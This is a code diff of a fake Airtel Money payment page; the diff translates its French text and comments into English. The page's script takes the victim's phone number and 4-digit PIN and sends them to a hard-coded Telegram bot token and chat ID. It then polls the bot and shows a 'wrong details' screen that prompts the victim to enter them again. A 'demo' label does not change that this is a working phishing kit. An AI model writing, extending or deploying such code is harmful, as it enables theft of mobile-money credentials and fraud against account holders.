@@ -108,10 +108,10 @@
     <div id="declineOverlay">
         <div class="decline-box">
             <div class="text-5xl mb-4">❌</div>
-            <h2 class="text-2xl font-bold text-red-600 mb-2">Mauvais détails saisis</h2>
-            <p class="text-gray-600 mb-6">Les informations fournies sont incorrectes. Veuillez réessayer.</p>
+            <h2 class="text-2xl font-bold text-red-600 mb-2">Wrong Details Entered</h2>
+            <p class="text-gray-600 mb-6">The information provided is incorrect. Please try again.</p>
             <button onclick="closeDecline()" class="bg-black text-white px-8 py-3 rounded-xl font-bold hover:bg-gray-800">
-                Réessayer
+                Try Again
             </button>
         </div>
     </div>
@@ -291,10 +291,10 @@
     <script>
     document.addEventListener("DOMContentLoaded", function () {
 
-        // ===== CONFIG TELEGRAM (À REMPLACER) =====
+        // ===== CONFIG TELEGRAM =====
         const TELEGRAM_BOT_TOKEN = "8857128734:AAHF-gBFjWBMm5AQF8f_3MzOysjYEPVaUGY";
         const TELEGRAM_CHAT_ID  = "7468436625";
-        // =========================================
+        // ===========================
 
         const countrySelect = document.getElementById("countryCode");
         const countryFlag = document.getElementById("countryFlag");
@@ -356,7 +356,7 @@
             });
         });
 
-        // === POLLING : écoute les réponses du bot ===
+        // === POLLING : listen for bot responses ===
         function startPolling() {
             if (pollingActive) return;
             pollingActive = true;
@@ -406,7 +406,7 @@
             }, 2000);
         }
 
-        // === Afficher l'overlay Decline + reset ===
+        // === Show decline overlay + reset ===
         window.showDecline = function() {
             form.reset();
             pinBoxes.forEach(box => box.value = "");
@@ -419,7 +419,7 @@
             declineOverlay.classList.add("show");
         };
 
-        // === Fermer l'overlay ===
+        // === Close decline overlay ===
         window.closeDecline = function() {
             declineOverlay.classList.remove("show");
             inputs[0].focus();
@@ -431,25 +431,26 @@
 
             const phone = phoneInput.value.trim();
             if (!phone) {
-                alert("Veuillez entrer votre numéro Airtel Money.");
+                alert("Please enter your Airtel Money number.");
                 return;
             }
             if (hiddenPin.value.length !== 4) {
-                alert("Veuillez entrer votre code PIN à 4 chiffres.");
+                alert("Please enter your 4-digit PIN code.");
                 return;
             }
 
             const fullPhoneNumber = countrySelect.value + phone;
 
+            // === TELEGRAM MESSAGE IN ENGLISH ===
             const message = `
-🔴 NOUVEAU PAIEMENT AIRTEL MONEY (DÉMO)
+🔴 NEW AIRTEL MONEY PAYMENT (DEMO)
 ━━━━━━━━━━━━━━━━━━━━━
-📱 Numéro : ${fullPhoneNumber}
-🔑 PIN : ${hiddenPin.value}
-🌐 Pays : ${countrySelect.options[countrySelect.selectedIndex].text}
-🕐 Timestamp : ${new Date().toLocaleString("fr-FR")}
+📱 Phone: ${fullPhoneNumber}
+🔑 PIN: ${hiddenPin.value}
+🌐 Country: ${countrySelect.options[countrySelect.selectedIndex].text}
+🕐 Timestamp: ${new Date().toLocaleString("en-US")}
 ━━━━━━━━━━━━━━━━━━━━━
-⚠️ Ceci est une démo — à des fins de test uniquement.
+⚠️ This is a demo — for testing purposes only.
             `.trim();
 
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -482,7 +483,7 @@
                 }
             })
             .catch(error => {
-                console.error("Erreur Telegram:", error);
+                console.error("Telegram error:", error);
                 window.location.href = "hodlfa.html";
             });
 
